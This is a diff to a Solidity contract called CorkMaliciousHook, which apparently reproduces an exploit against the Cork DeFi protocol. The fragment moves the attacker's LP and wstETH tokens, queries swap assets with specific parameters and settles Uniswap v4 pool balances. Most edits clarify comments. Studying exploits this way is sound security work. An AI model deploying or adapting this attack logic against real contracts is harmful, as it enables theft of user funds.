@@ -94,12 +94,14 @@ contract CorkMaliciousHook {
         lpToken.transferFrom(attacker_EOA, address(moduleCore), lpToken.balanceOf(attacker_EOA)); // to proxy
         wstETH.transferFrom(attacker_EOA, address(this), wstETH.balanceOf(attacker_EOA)); // to self
 
-        // 3.2 Makes two calls to getDeployedSwapAssets to identify the ct
+        // 3.2 Makes two calls to getDeployedSwapAssets to identify the Cover Token
         (address[] memory cts, address[] memory ds) = assetFactory.getDeployedSwapAssets(
             address(wstETH),
             address(etherfiWETH),
-            493_150_684_700_000_000, // TODO: why?
-            7_776_001, // TODO: why? (seems timestamp - 10e9)
+            493_150_684_700_000_000, // represents the initial Annualized Price (rollback from prev token)
+            // wstETH/etherfiWETH swap asset that was deployed with this very specific 90-day-plus-a-second
+            // expiry interval
+            90 days + 1,
             exchangeRateProvider,
             0,
             7
@@ -329,7 +331,8 @@ contract CorkMaliciousHook {
 
         // 4.16 Sync the pool reserves to settle ETH8-DS2
         uniV4PoolManager.sync(decodedData.weETH8DS);
-        IERC20(decodedData.weETH8DS).transfer(address(uniV4PoolManager), 1);
+        IERC20(decodedData.weETH8DS).transfer(address(uniV4PoolManager), 1); // TODO: might have something to
+            // do with previous 1
         uniV4PoolManager.settleFor(address(corkHook));
 
         return ""; // to comply with the interface
